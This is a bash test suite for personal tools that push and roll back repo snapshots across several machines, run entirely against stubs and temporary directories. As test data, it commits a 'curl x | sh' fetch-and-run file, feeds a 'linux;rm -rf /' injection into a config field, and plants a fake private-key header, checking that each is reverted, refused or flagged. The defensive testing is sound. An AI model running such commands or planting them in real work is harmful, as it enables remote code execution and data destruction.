#!/usr/bin/env bash
# tests/fleet -- tools/fleet (micro) and tools/fleet-apply (every machine). Each fake machine has its
# own HOME with real git checkouts of the three repos (arch-bootstrap, a bare dotfiles repo whose work
# tree is that HOME, secrets), all cloned from local bare origins. A real `script` pty; sudo,
# bootstrap.sh, authorized-keys, ssh, ssh-agent/ssh-add, tailscale and pgrep are stubs. The stub sudo
# accepts "pw-ok" on stdin for -v and then answers -n from a ticket file (sudo's per-pty cache).
# Never touches the real HOME, real sudo or another machine.
set -uo pipefail
root=$(cd "$(dirname "$0")/.." && pwd)
t=$(mktemp -d); trap 'rm -rf "$t"' EXIT
export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t
mkdir -p "$t/bin"
pass=0 fail=0
check() { if eval "$2"; then pass=$((pass+1)); echo "pass  $1"; else fail=$((fail+1)); echo "FAIL  $1"; [[ -n ${DEBUG:-} ]] && sed "s/^/        /" <<<"${out:-}" | tail -15; fi; }
commit() { local d=$1 f=$2 c=$3 m=$4; mkdir -p "$(dirname "$d/$f")"; echo "$c" > "$d/$f"; git -C "$d" add -A; git -C "$d" commit -qm "$m"; git -C "$d" push -q; git -C "$d" rev-parse HEAD; }

# ---- origins
git init -q --bare -b main "$t/ab.git"; git clone -q "$t/ab.git" "$t/ab-seed" 2>/dev/null
cat > "$t/ab-seed/bootstrap.sh" <<'EOF'
#!/bin/sh
# stub: record how it was run, and use sudo the way run() does; fail on demand
{ echo "args: $*"; echo "ignore: ${PACMAN_IGNORE:-}"; [ -t 0 ] && echo "tty: yes" || echo "tty: no"; sudo -n true && echo "sudo: cached" || echo "sudo: NOT cached"; } >> "$HOME/bootstrap.calls"
[ ! -e "$HOME/bootstrap.fail" ]
EOF
mkdir -p "$t/ab-seed/tools"; cp "$root/tools/fleet-apply" "$root/tools/fleet" "$root/tools/secret-scan" "$t/ab-seed/tools/"
printf '#!/bin/sh\necho "ak: $*" >> "$HOME/ak.calls"\n' > "$t/ab-seed/tools/authorized-keys"
# a stub aur-pin: "auto" moves the one pin and says so; "changes" names it (the review calls it)
printf '#!/bin/sh\ncase "$1" in auto) echo "pkg-a 2222222222222222222222222222222222222222" > "$AUR_PIN_LIST"; echo "move   pkg-a 1 -> 2" ;; changes) echo "pkg-a: 1 -> 2" ;; esac\n' > "$t/ab-seed/tools/aur-pin"
chmod +x "$t/ab-seed/bootstrap.sh" "$t/ab-seed/tools/"*
git -C "$t/ab-seed" add -A; git -C "$t/ab-seed" commit -qm "ab one"; git -C "$t/ab-seed" push -q origin main
ab1=$(git -C "$t/ab-seed" rev-parse HEAD)
ab2=$(commit "$t/ab-seed" two ab2 "ab two")

git init -q --bare -b master "$t/dot.git"; git clone -q "$t/dot.git" "$t/dot-seed" 2>/dev/null
echo rc1 > "$t/dot-seed/.zshrc"; git -C "$t/dot-seed" add -A; git -C "$t/dot-seed" commit -qm "dot one"; git -C "$t/dot-seed" push -q origin master
dot1=$(git -C "$t/dot-seed" rev-parse HEAD)
dot2=$(commit "$t/dot-seed" .zshrc rc2 "dot two")

git init -q --bare -b master "$t/sec.git"; git clone -q "$t/sec.git" "$t/sec-seed" 2>/dev/null
echo v1 > "$t/sec-seed/Passwords.kdbx"; mkdir -p "$t/sec-seed/ssh/authorized_keys"
for h in self h1 h2; do echo "# $h" > "$t/sec-seed/ssh/authorized_keys/$h"; done
git -C "$t/sec-seed" add -A; git -C "$t/sec-seed" commit -qm "sec one"; git -C "$t/sec-seed" push -q origin master
sec1=$(git -C "$t/sec-seed" rev-parse HEAD)
sec2=$(commit "$t/sec-seed" ssh/keys k2 "sec two")

# ---- one HOME per machine, everything at the FIRST commits
mkhome() {
  local H=$t/home-$1; mkdir -p "$H/projects"
  git clone -q "$t/ab.git" "$H/projects/arch-bootstrap" 2>/dev/null; git -C "$H/projects/arch-bootstrap" reset -q --hard "$ab1"
  git clone -q --bare "$t/dot.git" "$H/.dot"
  git --git-dir="$H/.dot" config remote.origin.fetch '+refs/heads/*:refs/remotes/origin/*'; git --git-dir="$H/.dot" fetch -q origin
  git --git-dir="$H/.dot" --work-tree="$H" checkout -q -f master; git --git-dir="$H/.dot" --work-tree="$H" reset -q --hard "$dot1"
  git --git-dir="$H/.dot" branch -q --set-upstream-to=origin/master master
  git clone -q "$t/sec.git" "$H/secrets" 2>/dev/null; git -C "$H/secrets" reset -q --hard "$sec1"
}
for h in self h1 h2; do mkhome "$h"; done

cat > "$t/bin/sudo" <<EOF
#!/bin/bash
for a; do case \$a in -k) rm -f "$t/ticket" ;; esac; done
if [[ " \$* " == *" -v "* ]]; then IFS= read -r p; [[ \$p == pw-ok ]] && touch "$t/ticket" && exit 0; echo attempt >> "$t/sudo.fail"; exit 1; fi
if [[ " \$* " == *" -n "* ]]; then [[ -e "$t/ticket" ]]; exit; fi
exit 0
EOF
printf '#!/bin/bash\n[[ -e "%s/locked" ]] && printf "When Type Source Valid\\n%%s TTY /dev/pts/0 V\\n" "$(date "+%%F %%T")" "$(date "+%%F %%T")" "$(date "+%%F %%T")"\nexit 0\n' "$t" > "$t/bin/faillock"   # stub: the real one reads THIS machine's lockouts
printf '#!/bin/bash\n[[ "$*" == "-x keepassxc" && -e "%s/kpx.${FLEET_HOST:-x}" ]]\n' "$t" > "$t/bin/pgrep"
chmod +x "$t/bin/"*; export PATH="$t/bin:$PATH"

# fleet-apply as machine $1 (its own HOME), request in the remaining args, stdin passed through
fa() { local h=$1; shift; HOME=$t/home-$h FLEET_HOST=$h FLEET_VAULT_HOST=h1 "$t/home-$h/projects/arch-bootstrap/tools/fleet-apply" "$@"; }
H=$t/home-self
abat() { git -C "$t/home-$1/projects/arch-bootstrap" rev-parse HEAD; }
dotat() { git --git-dir="$t/home-$1/.dot" rev-parse HEAD; }
secat() { git -C "$t/home-$1/secrets" rev-parse HEAD; }

# ================= fleet-apply apply
check "status before any apply: none"                 '[[ $(fa self status) == none ]]'
check "apply needs three full ids"                     '! echo pw-ok | fa self apply main "$dot2" "$sec2" >/dev/null'
check "a stage outside the allowlist is refused"       '! echo pw-ok | fa self apply "$ab2" "$dot2" "$sec2" tailnet >/dev/null'
check "request must be status|secrets-push|apply"      '! fa self bash >/dev/null'
rm -f "$t/ticket" "$H/bootstrap.calls" "$H/ak.calls"
out=$(echo pw-ok | SSH_ORIGINAL_COMMAND="apply $ab2 $dot2 $sec2" fa self 2>&1); rc=$?
check "apply a snapshot (via SSH_ORIGINAL_COMMAND): rc 0"   '(( rc == 0 ))'
check "...arch-bootstrap, dotfiles, secrets at exactly it"  '[[ $(abat self) == "$ab2" && $(dotat self) == "$dot2" && $(secat self) == "$sec2" ]]'
check "...arch-bootstrap still on branch main (ff)"         '[[ $(git -C "$H/projects/arch-bootstrap" symbolic-ref --short HEAD) == main ]]'
check "...the dotfiles work tree is HOME"                   '[[ $(cat "$H/.zshrc") == rc2 ]]'
check "...authorized_keys installed from that secrets"      'grep -qx "ak: enable --yes" "$H/ak.calls"'
check "...bootstrap ran the default stages, tty, sudo cached" 'grep -qx "args: --only packages,aur,services,xmonad,verify" "$H/bootstrap.calls" && grep -qx "tty: yes" "$H/bootstrap.calls" && grep -qx "sudo: cached" "$H/bootstrap.calls"'
check "...applied records the three ids, rc=0"              '[[ $(fa self status) == "$ab2 $dot2 $sec2 "*" rc=0 stages=packages aur services xmonad verify" ]]'
check "...password nowhere on disk"                         '! grep -rq pw-ok "$H/.local/state" "$H/bootstrap.calls"'
rm -f "$H/bootstrap.calls"
out=$(echo pw-ok | fa self apply "$ab1" "$dot1" "$sec1" services 2>&1); rc=$?
check "rollback to older ids: code + dotfiles back, detached" '(( rc == 0 )) && [[ $(abat self) == "$ab1" && $(dotat self) == "$dot1" ]] && ! git -C "$H/projects/arch-bootstrap" symbolic-ref -q HEAD >/dev/null'
check "...secrets never go back"                             '[[ $(secat self) == "$sec2" ]] && grep -q "secrets: already past the snapshot" <<<"$out"'
check "...only the requested stage"                          'grep -qx "args: --only services" "$H/bootstrap.calls"'
offmain=$(cd "$t/ab-seed" && git commit -q --allow-empty -m local && git rev-parse HEAD); git -C "$t/ab-seed" reset -q --hard HEAD~1
git -C "$H/projects/arch-bootstrap" fetch -q "$t/ab-seed" "$offmain" 2>/dev/null
check "a commit not on origin/main is refused"               '! echo pw-ok | fa self apply "$offmain" "$dot2" "$sec2" >/dev/null 2>&1'
rm -f "$H/bootstrap.calls" "$H/ak.calls"
out=$(echo pw-ok | fa self apply "$ab2" "$dot2" "$sec2" keys 2>&1); rc=$?
check "keys only: moves + authorized_keys, no bootstrap"     '(( rc == 0 )) && [[ $(abat self) == "$ab2" ]] && grep -q "ak: enable" "$H/ak.calls" && [[ ! -e $H/bootstrap.calls ]] && [[ $(fa self status) == *" stages=keys" ]]'
mkdir -p "$H/.config/fleet"; echo "packages: task 1 RAM window until 2026-10-11" > "$H/.config/fleet/hold"
rm -f "$t/ticket" "$H/bootstrap.calls"
out=$(echo pw-ok | fa self apply "$ab2" "$dot2" "$sec2" 2>&1)
check "hold: packages skipped and reported"                  'grep -q "hold  packages: task 1" <<<"$out" && grep -qx "args: --only aur,services,xmonad,verify" "$H/bootstrap.calls"'
echo "ignore-pkgs: linux,linux-headers -- task 1 RAM window" > "$H/.config/fleet/hold"; rm -f "$t/ticket" "$H/bootstrap.calls"
out=$(echo pw-ok | fa self apply "$ab2" "$dot2" "$sec2" 2>&1)
check "hold ignore-pkgs: packages stage runs, PACMAN_IGNORE passed" 'grep -qx "args: --only packages,aur,services,xmonad,verify" "$H/bootstrap.calls" && grep -qx "ignore: linux,linux-headers" "$H/bootstrap.calls"'
echo "ignore-pkgs: linux;rm -rf /" > "$H/.config/fleet/hold"
check "...a malformed ignore-pkgs is refused"                '! echo pw-ok | fa self apply "$ab2" "$dot2" "$sec2" >/dev/null 2>&1'
rm "$H/.config/fleet/hold"
rm -f "$t/ticket" "$H/bootstrap.calls" "$t/sudo.fail"
out=$(echo wrong | fa self apply "$ab2" "$dot2" "$sec2" 2>&1); rc=$?
check "wrong password: nonzero, bootstrap never ran, one sudo attempt" '(( rc != 0 )) && [[ ! -e $H/bootstrap.calls ]] && [[ $(wc -l < "$t/sudo.fail") == 1 ]]'
sec3=$(commit "$t/sec-seed" Passwords.kdbx v3 "vault v3"); touch "$t/kpx.self"
check "snapshot changes the vault while KeePassXC runs: error, secrets not moved" '! echo pw-ok | fa self apply "$ab2" "$dot2" "$sec3" >/dev/null 2>&1 && [[ $(secat self) == "$sec2" ]]'
rm "$t/kpx.self"

# ================= fleet-apply secrets-push (h1 is the vault host)
sp() { fa "$1" secrets-push 2>&1; }
S2=$t/home-h2/secrets S1=$t/home-h1/secrets
for h in h1 h2; do git -C "$t/home-$h/secrets" pull -q; done
check "nothing local: ok, and never pulls"            'git -C "$S2" reset -q --hard "$sec1"; grep -q "nothing to push" <<<"$(sp h2)" && [[ $(git -C "$S2" rev-parse HEAD) == "$sec1" ]]'
git -C "$S2" pull -q; echo k-h2 > "$S2/ssh/keys"; git -C "$S2" commit -qam "h2 key"
check "ahead on ssh/ (not the vault host): pushed"     'grep -q "pushed 1 commit" <<<"$(sp h2)" && git -C "$t/sec-seed" pull -q && [[ $(cat "$t/sec-seed/ssh/keys") == k-h2 ]]'
echo v-h2 > "$S2/Passwords.kdbx"; git -C "$S2" commit -qam "h2 vault"
check "a vault commit off the vault host: error, not pushed" '! sp h2 >/dev/null; grep -q "source of truth is h1" <<<"$(sp h2)" && git -C "$t/sec-seed" pull -q && [[ $(cat "$t/sec-seed/Passwords.kdbx") == v3 ]]'
git -C "$S2" reset -q --hard '@{u}'
git -C "$S1" pull -q; echo v-saved > "$S1/Passwords.kdbx"; commit "$t/sec-seed" ssh/keys k-meanwhile x >/dev/null
check "vault saved on the vault host, origin moved: committed, rebased, pushed" 'o=$(sp h1); grep -q "committed the saved Passwords.kdbx on h1" <<<"$o" && grep -q "rebased 1" <<<"$o" && git -C "$t/sec-seed" pull -q && [[ $(cat "$t/sec-seed/Passwords.kdbx") == v-saved ]]'
git -C "$S2" pull -q; echo k-local > "$S2/ssh/keys"; git -C "$S2" commit -qam local; commit "$t/sec-seed" ssh/keys k-remote x >/dev/null
check "diverged on the same file: error, rebase aborted" '! sp h2 >/dev/null; grep -q "the rebase conflicts" <<<"$(sp h2)" && [[ $(cat "$S2/ssh/keys") == k-local && ! -d $S2/.git/rebase-merge ]]'
git -C "$S2" reset -q --hard '@{u}'; echo k-x > "$S2/ssh/keys"; git -C "$S2" commit -qam x; commit "$t/sec-seed" Passwords.kdbx v4 x >/dev/null
check "diverged and origin changed the vault: error"   '! sp h2 >/dev/null; grep -q "the vault is never merged" <<<"$(sp h2)"'
git -C "$S2" reset -q --hard '@{u}'; echo dirty >> "$S2/Passwords.kdbx"
check "uncommitted vault off the vault host: error"     '! sp h2 >/dev/null; grep -q "uncommitted changes on h2: Passwords.kdbx" <<<"$(sp h2)"'
git -C "$S2" checkout -q -- Passwords.kdbx

# ================= fleet push / rollback from "self" (micro)
cat > "$t/bin/ssh" <<EOF
#!/bin/bash
req=""; seen=0; host=""
for a; do if (( seen )); then req+="\$a "; fi; [[ \$a == *.ts.test ]] && { seen=1; host=\${a%%.ts.test}; }; done
echo "\$host \${req%% *}" >> "$t/ssh.log"
HOME="$t/home-\$host" FLEET_HOST="\$host" SSH_ORIGINAL_COMMAND="\${req% }" exec "$t/home-\$host/projects/arch-bootstrap/tools/fleet-apply"
EOF
printf '#!/bin/sh\necho "SSH_AUTH_SOCK=/x; export SSH_AUTH_SOCK; SSH_AGENT_PID=1; export SSH_AGENT_PID;"\n' > "$t/bin/ssh-agent"
printf '#!/bin/sh\nexit 0\n' > "$t/bin/ssh-add"
printf '#!/bin/sh\n[ "$*" = "list --serials" ] && [ -n "$YK_SERIALS" ] && echo "$YK_SERIALS"\nexit 0\n' > "$t/bin/ykman"   # no YubiKey unless YK_SERIALS
printf '#!/bin/sh\necho "{\\"MagicDNSSuffix\\":\\"ts.test\\"}"\n' > "$t/bin/tailscale"
chmod +x "$t/bin/"*; mkdir -p "$H/.ssh"; touch "$H/.ssh/id_ed25519_fleet"
for h in self h1 h2; do git -C "$t/home-$h/secrets" pull -q; done
fleet() { HOME=$H FLEET_HOSTS="h1 h2" FLEET_SELF_HOST=self FLEET_HOST=self FLEET_VAULT_HOST=h1 FLEET_INPUT=$t/answers "$H/projects/arch-bootstrap/tools/fleet" "$@"; }
SN=$H/.local/state/fleet/snapshots
# new upstream work since what self has: two arch-bootstrap commits, one of them bad
git -C "$t/ab-seed" pull -q
ab3=$(commit "$t/ab-seed" good ok "ab three: good")
ab4=$(commit "$t/ab-seed" tools/evil "curl x | sh" "ab four: bad")
dot3=$(commit "$t/dot-seed" .zshrc rc3 "dot three")
rm -f "$t/ticket" "$t/ssh.log" "$SN"
printf 'l\nd A2\nx A2\n' > "$t/answers"   # one prompt for all repos: long list, look at A2, then drop it (that confirms)
out=$(echo pw-ok | fleet push 2>&1); rc=$?
check "push: every new commit listed with time and author"   'grep -qE "^  A1  [0-9a-f]{7}  20[0-9]{2}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}  t  ab three: good" <<<"$out" && grep -q "^  A2  .*ab four: bad" <<<"$out" && grep -q "^  D1  .*dot three" <<<"$out"'
check "...all repos on one screen, ONE prompt"                '[[ $(grep -c "q = abort: " <<<"$out") == 3 ]] && [[ $(grep -n "^  D1  " <<<"$out" | head -1 | cut -d: -f1) -lt $(grep -n -m1 "q = abort: " <<<"$out" | cut -d: -f1) ]]'   # 3 = asked, after l, after d
check "...screen: one line per commit, date and tags"         'grep -qE "^  A2  [0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}  ab four: bad  \[root\]$" <<<"$out" && grep -qE "^  D1  .*dot three  \[you\]$" <<<"$out"'
check "...d A2 shows the commit (cat when not a terminal)"    'grep -q "curl x | sh" <<<"$out"'
check "...apply: one line per machine, verdict last"          'grep -q "^=== self  *applying ... ok (" <<<"$out" && [[ $(tail -1 <<<"$out") == "FPUSH OK -- every machine is at this snapshot" ]] && [[ -s $H/.local/state/fleet/apply-h1.log ]]'
check "...risky files marked"                                 'grep -q "tools/evil    <- runs as root" <<<"$out" && grep -q ".zshrc    <- runs as you" <<<"$out"'
ab_snap=$(git -C "$t/ab.git" rev-parse main)
check "...the excluded commit is reverted on origin main"     '[[ $(git -C "$t/ab.git" log -1 --format=%s main) == "fleet review on micro: exclude 1 commit(s)" ]] && ! git -C "$t/ab.git" show main:tools/evil >/dev/null 2>&1'
check "...every machine at the snapshot, bad file absent"     '(( rc == 0 )) && for h in self h1 h2; do [[ $(abat $h) == "$ab_snap" && $(dotat $h) == "$dot3" ]] || exit 1; done; [[ ! -e $t/home-h1/projects/arch-bootstrap/tools/evil && -e $t/home-h1/projects/arch-bootstrap/good ]]'
check "...micro (self) applied before the others"             '[[ $(grep -m1 -n "^=== self" <<<"$out" | cut -d: -f1) -lt $(grep -m1 -n "^=== h1" <<<"$out" | cut -d: -f1) ]]'
check "...vault host's secrets pushed first"                  '[[ $(head -1 "$t/ssh.log") == "h1 secrets-push" ]]'
check "...snapshot recorded"                                  '[[ $(wc -l < "$SN") == 1 ]] && grep -q " $ab_snap $dot3 " "$SN"'
rm -f "$t/ticket"; : > "$t/ssh.log"; printf 'y\n' > "$t/answers"   # nothing new anywhere: only the confirm
out=$(echo pw-ok | fleet push 2>&1); rc=$?
check "push again, nothing new: all skipped, no new snapshot line" '(( rc == 0 )) && grep -q "nothing new" <<<"$out" && grep -q "^h1 .*skip (already at this snapshot)" <<<"$out" && ! grep -q " apply" "$t/ssh.log" && [[ $(wc -l < "$SN") == 1 ]]'
fake="-----""BEGIN OPENSSH PRIVATE KEY-----"   # in two pieces, so this file does not trip secret-scan itself
dot4=$(commit "$t/dot-seed" .config/app/key "$fake" "dot four"); rm -f "$t/ticket"; printf 'l\nq\n' > "$t/answers"   # long list, then q
out=$(echo pw-ok | fleet push 2>&1); rc=$?
check "q at the review: aborted, nothing applied"             '(( rc != 0 )) && grep -q "aborted at review" <<<"$out" && [[ $(dotat self) == "$dot3" && $(wc -l < "$SN") == 1 ]]'
check "a key in a dotfiles commit is flagged by file and kind" 'grep -q "!! POSSIBLE SECRET  .config/app/key: private key block" <<<"$out" && grep -q "1 POSSIBLE SECRET(S) (tagged SECRET?)" <<<"$out" && grep -q "dot four  \[SECRET?\]" <<<"$out"'
check "...and the key text itself is not printed"             '! grep -q "OPENSSH PRIVATE" <<<"$out"'
rm -f "$t/ticket"; : > "$t/ssh.log"
out=$(echo wrong | fleet push 2>&1); rc=$?
check "wrong sudo password: stops before any ssh"             '(( rc != 0 )) && [[ ! -s $t/ssh.log ]]'
git -C "$t/home-h2/secrets" pull -q; echo k-h2b > "$t/home-h2/secrets/ssh/keys"; git -C "$t/home-h2/secrets" commit -qam h2b
commit "$t/sec-seed" ssh/keys k-origin x >/dev/null
rm -f "$t/ticket"; printf '\ny\n' > "$t/answers"   # keep all; confirm
out=$(echo pw-ok | fleet push 2>&1); rc=$?
check "h2 with out-of-sync secrets: FAILED, not updated; others go on" '(( rc != 0 )) && grep -q "^h2 .*FAILED secrets out of sync, not updated" <<<"$out" && [[ $(dotat h2) == "$dot3" && $(dotat h1) == "$dot4" && $(dotat self) == "$dot4" ]]'
git -C "$t/home-h2/secrets" reset -q --hard '@{u}'
dot5=$(commit "$t/dot-seed" .zshrc rc5 "dot five"); touch "$H/bootstrap.fail"; rm -f "$t/ticket"; printf '\ny\n' > "$t/answers"   # dotfiles: keep; confirm
out=$(echo pw-ok | fleet push 2>&1); rc=$?
check "micro fails: nobody else is touched, no snapshot"      '(( rc != 0 )) && grep -q "^h1 .*not attempted (self failed)" <<<"$out" && [[ $(dotat h1) == "$dot4" && $(wc -l < "$SN") == 2 ]]'
rm -f "$H/bootstrap.fail"
git -C "$t/ab-seed" pull -q; git -C "$t/ab-seed" reset -q --hard "$ab3"; git -C "$t/ab-seed" push -q -f origin main
rm -f "$t/ticket"; printf '\n\n\ny\n' > "$t/answers"
out=$(echo pw-ok | fleet push 2>&1); rc=$?
check "origin history rewritten (force push): stop, nothing applied" '(( rc != 0 )) && grep -q "history was rewritten" <<<"$out" && [[ $(dotat self) == "$dot5" && $(wc -l < "$SN") == 2 ]]'   # dot5: the failed push above moved micro before its stage failed
git -C "$t/ab-seed" reset -q --hard "$ab_snap"; git -C "$t/ab-seed" push -q -f origin main
rm -f "$t/ticket"; printf 'y\n' > "$t/answers"
out=$(echo pw-ok | fleet rollback 2>&1); rc=$?
check "rollback (micro only): self back to the previous snapshot" '(( rc == 0 )) && [[ $(dotat self) == "$dot3" ]] && [[ $(dotat h1) == "$dot4" ]] && grep -q "^h1 .*not touched" <<<"$out"'
check "...recorded as the newest snapshot"                    '[[ $(tail -1 "$SN") == *" $dot3 "*rollback-of* ]]'

# ================= packages: repo-date bump and holds (beast-arch 76)
mkdb() {  # mkdb <date> <name-ver-rel...>: a fake archive day with one core repo
  local d=$t/ala/${1//-//}/core/os/x86_64 w=$t/db; shift; rm -rf "$w"; mkdir -p "$d" "$w"
  for e; do mkdir -p "$w/$e"; echo x > "$w/$e/desc"; done
  (cd "$w" && bsdtar -czf "$d/core.db" "$@")
}
mkdb 2026-10-02 linux-7.2.8.arch1-2 foo-1.0-1 held-2.0-1 other-1-1
mkdb 2026-10-09 linux-7.2.9.arch1-1 foo-1.1-1 held-3.0-1 other-2-1
printf '#!/bin/sh\ncase "$1" in -Qq) printf "linux\\nfoo\\nheld\\n" ;; -Q) echo "$2 1.0-1" ;; esac\n' > "$t/bin/pacman"; chmod +x "$t/bin/pacman"
git -C "$t/ab-seed" pull -q
echo 2026-10-02 > "$t/ab-seed/repo-date"; printf '# c\nh1 held 2.0-1 -- broke h1\n' > "$t/ab-seed/holds"
# one AUR pin (the stub aur-pin, in every checkout from the start, moves it)
echo "pkg-a 1111111111111111111111111111111111111111" > "$t/ab-seed/pkglist-aur.txt"
git -C "$t/ab-seed" add -A; git -C "$t/ab-seed" commit -qm "pin the date"; git -C "$t/ab-seed" push -q
pf() { FLEET_ARCHIVE_URL=file://$t/ala FLEET_TODAY=$1 fleet push; }
rm -f "$t/ticket"; printf 'p\ny\n\ny\n' > "$t/answers"   # print the changes, take the date; review: keep all; confirm
out=$(echo pw-ok | pf 2026-10-09 2>&1); rc=$?
